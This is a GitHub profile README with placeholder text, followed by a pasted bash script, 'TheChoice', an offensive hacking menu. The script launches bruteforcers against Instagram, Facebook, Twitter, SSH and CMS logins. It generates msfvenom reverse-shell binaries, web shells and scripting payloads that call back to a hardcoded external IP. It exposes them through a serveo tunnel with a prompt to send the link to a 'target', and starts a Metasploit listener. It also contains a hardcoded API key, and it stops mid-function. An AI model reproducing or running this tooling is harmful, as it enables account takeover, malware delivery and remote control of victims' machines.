- 👋 Hi, I’m @sadik2053
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
sadik2053/sadik2053 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
#!/usr/bin/env bash
# TheChoice v1.0
# Coded by @thelinuxchoice (Don't change, noob!)
# Github: https://github.com/thelinuxchoice/thechoice


lhost="159.89.214.31"
format=""

menu_ift() {
clear
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Resume Session\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_ift
if [[ $option_ift == 1 || $option_ift == 01 ]]; then
cd $dir_ift
bash $file_ift
elif [[ $option_ift == 2 || $option_ift == 02 ]]; then
cd $dir_ift
bash $file_ift --resume


elif [[ $option_ift == 99 ]]; then
clear
menu_bruteforcers
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_ift
fi
}

menu_ssh() {
clear
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] SSH Scan\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] SSH Bruteforcer (requires target list)\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_ssh

if [[ $option_ssh == 1 || $option_ssh == 01 ]]; then
bash tools/ssh/fastssh.sh --scan
elif [[ $option_ssh == 2 || $option_ssh == 02 ]]; then
bash tools/ssh/fastssh.sh --bruteforcer
elif [[ $option_ift == 99 ]]; then
clear
menu_bruteforcers

else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_ssh
fi

}

menu_http() {

read -p $'\e[1;92m[*] URL (\e[0m\e[1;77mFormat: http(s)://example.com\e[0m\e[1;92m): \e[0m\e[1;77m ' url_http
if [[ $url_http == "" ]]; then

printf "Please, put an Valid URL!"
sleep 1
clear
menu_http
elif [[ ! $url_http == *'http'* ]]; then
printf "Please, put an Valid URL!"
sleep 1
clear
menu_http
else
python tools/brutehttp/brutehttp.py $url_http
fi
}



menu_bruteforcers() {

clear
#banner

printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Instagram\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Facebook\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Twitter\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m04\e[0m\e[1;93m] SSH\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m05\e[0m\e[1;93m] HTTP (Auth/POST/GET/Digest)\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m06\e[0m\e[1;93m] CMS (Wordpress, Joomla, Drupal, OpenCart)\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_brute

if [[ $option_brute == 1 || $option_brute == 01 ]]; then
dir_ift="tools/insta/"
file_ift="instainsane.sh"
menu_ift

elif [[ $option_brute == 2 || $option_brute == 02 ]]; then
dir_ift="tools/face/"
file_ift="facebash.sh"
menu_ift
elif [[ $option_brute == 3 || $option_brute == 03 ]]; then
dir_ift="tools/tweet/"
file_ift="tweetshell.sh"
menu_ift
elif [[ $option_brute == 4 || $option_brute == 04 ]]; then
menu_ssh
elif [[ $option_brute == 5 || $option_brute == 05 ]]; then
menu_http
elif [[ $option_brute == 6 || $option_brute == 06 ]]; then
dir_ift="tools/brutecms/"
file_ift="brutecms.sh"
menu_ift
elif [[ $option_brute == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_bruteforcers
fi



}

dependencies_payload() {

command -v msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }


}
server() {
chmod +x $payload_name*
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$lport 2> /dev/null &
sleep 3
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link to target + /%s%s:\e[0m\e[1;77m \n' $payload_name $format
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Starting MSF Listener...\e[0m\n'
printf "\n"
#nc -lvp $default_port2

}

listener() {
default_listr="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Start Server and MSF Listener?\e[0m\e[1;77m [Y/n]: ' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload >> handler.rc
printf "set LHOST 127.0.0.1\n" >> handler.rc
printf "set LPORT %s\n" $lport >> handler.rc
printf "set ExitOnSession false\n" >> handler.rc
printf "exploit -j -z\n" >> handler.rc
server
msfconsole -r handler.rc
rm -rf handler.rc
fi
}


start() {
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_lport=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
lport="${lport:-${default_lport}}"
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"



}

binaries_linux() {
format=".elf"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf

}

binaries_windows() {
format=".exe"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe


}

binaries_mac() {
format=".macho"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho


}


binaries() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Binaries Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Linux\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Windows\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] MAC\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_bin

if [[ $option_bin == 1 || $option_bin == 02 ]]; then
start
payload="linux/x86/meterpreter/reverse_tcp"
binaries_linux
listener

elif [[ $option_bin == 2 || $option_bin == 02 ]]; then
start
payload="windows/meterpreter/reverse_tcp"
binaries_windows
listener
elif [[ $option_bin == 3 || $option_bin == 03 ]]; then
start
payload="osx/x86/shell_reverse_tcp/"
binaries_mac
listener
elif [[ $option_bin == 99 ]]; then
clear
menu_payload
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
binaries
fi
}

php_payload() {
format=".php"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php

}

asp_payload() {
format=".asp"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
}

jsp_payload() {
format=".jsp"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp

}
war_payload() {
format=".war"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war

}

python_payload(){
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format

}

bash_payload() {
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format

}

perl_payload() {
format=".sh"
msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
}

webpayloads() {
clear
#banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Web Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] PHP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] ASP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] JSP\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m04\e[0m\e[1;93m] WAR\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_web

if [[ $option_web == 1 || $option_web == 01 ]]; then
payload="php/meterpreter_reverse_tcp"
start
php_payload
listener
elif [[ $option_web == 2 || $option_web == 02 ]]; then
payload="windows/meterpreter/reverse_tcp"
start
asp_payload
listener
elif [[ $option_web == 3 || $option_web == 03 ]]; then
payload="java/jsp_shell_reverse_tcp"
start
jsp_payload
listener
elif [[ $option_web == 4 || $option_web == 04 ]]; then
payload="java/jsp_shell_reverse_tcp"
start
war_payload
listener
elif [[ $option_web == 99 ]]; then
clear
menu_payload
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
webpayloads
fi


}


scripting() {
clear
#banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shell Scripting Payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Python\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Bash\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] Perl\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_script

if [[ $option_script == 1 ]]; then
payload="cmd/unix/reverse_python"
start
python_payload
listener
elif [[ $option_script == 2 ]]; then
payload="cmd/unix/reverse_bash"
start
bash_payload
listener
elif [[ $option_script == 3 ]]; then
payload="cmd/unix/reverse_perl"
start
perl_payload
listener
elif [[ $option_script == 99 ]]; then
clear
menu_payload
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
scripting
fi

}

shellcode_based() {
clear
#banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Language:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] C\e[0m       \e[1;93m[\e[0m\e[1;77m12\e[0m\e[1;93m] pl\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Bash\e[0m    \e[1;93m[\e[0m\e[1;77m13\e[0m\e[1;93m] powershell\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] CSharp\e[0m  \e[1;93m[\e[0m\e[1;77m14\e[0m\e[1;93m] ps1\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] dw\e[0m      \e[1;93m[\e[0m\e[1;77m15\e[0m\e[1;93m] py\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m5\e[0m\e[1;93m] dword\e[0m   \e[1;93m[\e[0m\e[1;77m16\e[0m\e[1;93m] python\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m6\e[0m\e[1;93m] hex\e[0m     \e[1;93m[\e[0m\e[1;77m17\e[0m\e[1;93m] raw\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m7\e[0m\e[1;93m] java\e[0m    \e[1;93m[\e[0m\e[1;77m18\e[0m\e[1;93m] rb\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m8\e[0m\e[1;93m] js_be\e[0m   \e[1;93m[\e[0m\e[1;77m19\e[0m\e[1;93m] ruby\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m9\e[0m\e[1;93m] js_le\e[0m   \e[1;93m[\e[0m\e[1;77m20\e[0m\e[1;93m] sh\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m10\e[0m\e[1;93m] num\e[0m    \e[1;93m[\e[0m\e[1;77m21\e[0m\e[1;93m] vbapplication\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m11\e[0m\e[1;93m] perl\e[0m   \e[1;93m[\e[0m\e[1;77m22\e[0m\e[1;93m] vbscript\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_lang

if [[ $option_lang == 1 ]]; then
lang="c"
elif [[ $option_lang == 2 ]]; then
lang="bash"
elif [[ $option_lang == 3 ]]; then
lang="csharp"
elif [[ $option_lang == 4 ]]; then
lang="dw"
elif [[ $option_lang == 5 ]]; then
lang="dword"

elif [[ $option_lang == 6 ]]; then
lang="hex"
elif [[ $option_lang == 7 ]]; then
lang="java"

elif [[ $option_lang == 8 ]]; then
lang="js_be"

elif [[ $option_lang == 9 ]]; then
lang="js_le"

elif [[ $option_lang == 10 ]]; then
lang="num"

elif [[ $option_lang == 11 ]]; then
lang="perl"

elif [[ $option_lang == 12 ]]; then
lang="pl"
echo n
elif [[ $option_lang == 13 ]]; then
lang="powershell"

elif [[ $option_lang == 14 ]]; then
lang="ps1"

elif [[ $option_lang == 15 ]]; then
lang="py"
elif [[ $option_lang == 16 ]]; then
lang="python"
elif [[ $option_lang == 17 ]]; then
lang="raw"
elif [[ $option_lang == 18 ]]; then
lang="rb"
elif [[ $option_lang == 19 ]]; then
lang="ruby"
elif [[ $option_lang == 20 ]]; then
lang="sh"
elif [[ $option_lang == 21 ]]; then
lang="vbapplication"
elif [[ $option_lang == 22 ]]; then
lang="vbscript"
elif [[ $option_lang == 99 ]]; then
shellcode
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
shellcode_based
fi



msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
listener
}

shellcode() {
clear
#banner
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shellcode based payloads:\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m1\e[0m\e[1;93m] Linux\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Windows\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] MAC\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_shell

if [[ $option_shell == 1 ]]; then
payload="linux/x86/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 2 ]]; then
payload="windows/meterpreter/reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 3 ]]; then
payload="osx/x86/shell_reverse_tcp"
start
shellcode_based
listener
elif [[ $option_shell == 99 ]]; then
clear
menu_payload
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
shellcode
fi

}




function  menu_payload() {
clear
dependencies_payload
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Binaries Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Web Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Scripting Payloads\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m04\e[0m\e[1;93m] Shellcode\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m05\e[0m\e[1;93m] FUD 32bit Windows .EXE file\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m06\e[0m\e[1;93m] Android Reverse Shell APK\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option

if [[ $option == 1 || $option == 01 ]]; then
clear
binaries
elif [[ $option == 2 || $option == 02 ]]; then
webpayloads
elif [[ $option == 3 || $option == 03 ]]; then
scripting
elif [[ $option == 4 || $option == 04 ]]; then
shellcode
elif [[ $option == 5 || $option == 05 ]]; then
cd tools/getwin
bash getwin.sh
elif [[ $option == 6 || $option == 06 ]]; then
cd tools/getdroid
bash getdroid.sh
elif [[ $option == 99 ]]; then
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
fi
}



#######################################
menu_infog() {
clear
printf "\n"                                                                   |
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[1;93m Website Info\e[0m          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[1;93m Check DNS Leak\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[1;93m Phone Info\e[0m            \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[1;93m Internet Speed test\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[1;93m Check e-mail\e[0m          \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[1;93m Find ip behind Cloudflare\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[1;93m My Info\e[0m               \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[1;93m Find Subdomains\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[1;93m Check site is up/down\e[0m \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[1;93m Check CMS\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[1;93m IP Tracker\e[0m            \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[1;93m Port Scan\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
read -p $'\e[1;92m[*] Choose an option: \e[0m' choice


if [[ $choice == "1" || $choice == "01" ]]; then
webinfo
elif [[ $choice == "2" || $choice == "02" ]]; then
phone
elif [[ $choice == "3" || $choice == "03" ]]; then
mailchecker
elif [[ $choice == "4" || $choice == "04"  ]]; then
myinfo
elif [[ $choice == "5" || $choice == "05" ]]; then
tangodown
elif [[ $choice == "6" || $choice == "06" ]]; then
iptracker
elif [[ $choice == "7" || $choice == "07" ]]; then
checkdns
elif [[ $choice == "8" || $choice == "08" ]]; then
speedtest
elif [[ $choice == "9" || $choice == "09" ]]; then
cloudflare
elif [[ $choice == "10" ]]; then
subdomain
elif [[ $choice == "11" ]]; then
checkcms
elif [[ $choice == "12" ]]; then
portscan
elif [[ $choice == "99" ]]; then
menu
else

printf "\n\e[1;43m[!] Invalid option!\e[0m\n\n"
menu_infog
fi
}

tangodown() {

read -p $'\e[1;92m[*] Site: \e[0m' ip_check

checktango=$(curl -sLi --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31' $ip_check | grep -o 'HTTP/1.1 200 OK\|HTTP/2 200')

if [[ $checktango == *'HTTP/1.1 200 OK'* ]] || [[ $checktango == *'HTTP/2 200'* ]]; then
printf "\e[1;92m[*] Site is Up!\e[0m\n"
else
printf "\e[1;93m[*] Site is Down!\e[0m\n"
fi
}
iptracker() {
if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi
read -p $'\e[1;92m[*] IP to Track: \e[0m' ip_tracker
IFS=$'\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip_tracker" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)

printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##


reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
}



phone() {

if [[ -e phoneinfo.txt ]]; then
rm -rf phoneinfo.txt
fi

read -p $'\e[1;92m[*] Phone (e.g.: 14158586273): \e[0m' phone

getphone=$(curl -s "apilayer.net/api/validate?access_key=43fc2577cf1cdb2eb522583eaee6ae8f&number='$phone'&country_code=&format=1" -L > phoneinfo.txt)

valid=$(grep -o 'valid\":true' phoneinfo.txt )
if [[ $valid == *'valid":true'* ]]; then


country=$(grep 'country_name\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
location=$(grep 'location\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
carrier=$(grep 'carrier\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
line_type=$(grep 'line_type\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
IFS=$'\n'
printf "\e[1;92m[*] Country:\e[0m\e[1;77m %s\e[0m\n" $country
printf "\e[1;92m[*] Location:\e[0m\e[1;77m %s\e[0m\n" $location
printf "\e[1;92m[*] Carrier:\e[0m\e[1;77m %s\e[0m\n" $carrier
printf "\e[1;92m[*] Line Type:\e[0m\e[1;77m %s\e[0m\n" $line_type

else
printf "\e[1;93m[!] Request invalid!\e[0m\n"
fi

}

webinfo() {

if [[ -e webinfo ]]; then
rm -rf webinfo
fi


read -p $'\e[1;92m[*] URL: \e[0m' site

curl -s "myip.ms/$site" -L > webinfo
##
IFS=$'\n'
ip_location=$(grep 'IP Location:' webinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $ip_location != "" ]]; then
printf "\e[1;92m[*] IP Location:\e[0m\e[1;77m %s\e[0m\n" $ip_location
fi
##

ip_range=$(grep -o 'IP Range .*' webinfo | head -n1 | cut -d "<" -f2 | cut -d ">" -f2)

if [[ $ip_range != "" ]]; then
printf "\e[1;92m[*] IP Range:\e[0m\e[1;77m %s\e[0m\n" $ip_range
fi

##
ip_reversedns=$(grep 'IP Reverse DNS' webinfo | grep 'sval' | head -n1 | cut -d ">" -f6 | cut -d "<" -f1)

if [[ $ip_reversedns != "" ]]; then
printf "\e[1;92m[*] IP Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $ip_reversedns
fi
##
ipv6=$(grep 'whois6' webinfo | cut -d "/" -f4 | cut -d "'" -f1 | head -n1)

if [[ $ipv6 != "" ]]; then
printf "\e[1;92m[*] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ipv6
fi
##
host_company=$(grep -o 'Hosting Company .*-.*.' webinfo | head -n1 | cut -d "-" -f2 | cut -d "." -f1)

if [[ $host_company != "" ]]; then
printf "\e[1;92m[*] Host Company:\e[0m\e[1;77m %s\e[0m\n" $host_company
fi
##
owner_address=$(grep -o 'Owner Address: .*' webinfo | cut -d ">" -f3 | cut -d "<" -f1)

if [[ $owner_address != "" ]]; then
printf "\e[1;92m[*] Owner Address:\e[0m\e[1;77m %s\e[0m\n" $owner_address
fi
##
hosting_country=$(grep 'Hosting Country:' webinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $hosting_country != "" ]]; then
printf "\e[1;92m[*] Hosting Country:\e[0m\e[1;77m %s\e[0m\n" $hosting_country
fi

###
hosting_phone=$(grep -o 'Hosting Phone: .*' webinfo | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $hosting_phone != "" ]]; then
printf "\e[1;92m[*] Hosting Phone:\e[0m\e[1;77m %s\e[0m\n" $hosting_phone
fi

###
hosting_website=$(grep -o 'Hosting Website: .*' webinfo | grep -o "href=.*" | cut -d "<" -f1 | cut -d ">" -f2)

if [[ $hosting_website != "" ]]; then
printf "\e[1;92m[*] Hosting Website:\e[0m\e[1;77m %s\e[0m\n" $hosting_website
fi

###
dnsNS=$(curl -s "https://dns-api.org/NS/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $dnsNS != "" ]]; then
printf "\e[1;92m[*] NS:\e[0m\e[1;77m %s\e[0m\n" $dnsNS
fi

###
MX=$(curl -s "https://dns-api.org/MX/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $MX != "" ]]; then
printf "\e[1;92m[*] MX:\e[0m\e[1;77m %s\e[0m\n" $MX
fi

if [[ -e webinfo ]]; then
rm -rf webinfo
fi
}
###

mailchecker() {

read -p $'\e[1;92m[*] Check e-mail: \e[0m' email

checkmail=$(curl -s https://api.2ip.me/email.txt?email=$email | grep -o 'true\|false')

if [[ $checkmail == 'true' ]]; then
printf "\e[1;92m[*] Valid e-mail!\e[0m\n"
elif [[ $checkmail == 'false' ]]; then
printf "\e[1;93m[!] Invalid e-mail!\e[0m\n"
fi

}

checkdns() {
IFS=$'\n'
printf "\n"
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[1/3]...\e[0m\n"
dns1=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns1=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns1" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns1 )
citydns1=$( grep -o "City Location:.*" checkdns1 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns1=$(grep -o 'Country:.*'  checkdns1 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[2/3]...\e[0m\n"
dns2=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
